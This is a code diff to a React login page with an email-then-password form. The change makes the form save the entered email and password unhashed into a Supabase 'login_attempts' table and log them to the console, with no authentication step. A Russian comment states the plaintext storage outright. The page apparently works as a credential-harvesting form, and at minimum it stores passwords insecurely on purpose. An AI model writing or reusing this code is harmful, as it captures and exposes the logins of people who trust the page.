@@ -2,6 +2,7 @@ import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import Logo from "@/components/Logo";
+import { supabase } from "@/integrations/supabase/client";
 
 const Login = () => {
   const [email, setEmail] = useState("");
@@ -9,15 +10,23 @@ const Login = () => {
   const [step, setStep] = useState<"email" | "password">("email");
   const [showPassword, setShowPassword] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (step === "email") {
       if (email) {
         setStep("password");
       }
     } else {
-      console.log("Login submitted:", { email, password });
-      // Здесь будет логика авторизации
+      // Сохраняем email и нехешированный пароль в БД
+      const { error } = await supabase
+        .from("login_attempts")
+        .insert({ email, password });
+      
+      if (error) {
+        console.error("Ошибка сохранения:", error);
+      } else {
+        console.log("Данные сохранены в БД:", { email, password });
+      }
     }
   };
 
